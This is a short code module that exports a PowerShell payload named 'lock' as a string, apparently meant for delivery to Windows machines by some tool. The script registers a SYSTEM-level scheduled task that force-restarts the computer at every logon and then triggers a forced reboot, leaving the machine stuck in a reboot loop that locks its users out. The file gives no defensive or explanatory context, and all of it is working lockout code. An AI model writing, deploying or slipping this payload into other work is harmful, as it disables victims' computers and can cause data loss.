export const lock = `if ($null -ne (Get-ScheduledTask | Where-Object {$_.TaskName -eq "Reboot-At-Logon"}))    {
    Get-ScheduledTask -TaskName "Reboot-At-Logon" | Unregister-ScheduledTask -Confirm:$false
}
#Create task
$A = New-ScheduledTaskAction -Execute "Shutdown.exe" -Argument "-r -t 0 -f"
$T = New-ScheduledTaskTrigger -AtLogon
$P = New-ScheduledTaskPrincipal "SYSTEM"
$S = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -RestartCount 3 -RestartInterval (New-TimeSpan -Seconds 60) -StartWhenAvailable
$D = New-ScheduledTask -Action $A -Principal $P -Trigger $T -Settings $S
$Task = Register-ScheduledTask "Reboot-At-Logon" -InputObject $D
shutdown -r -f -t 30
`;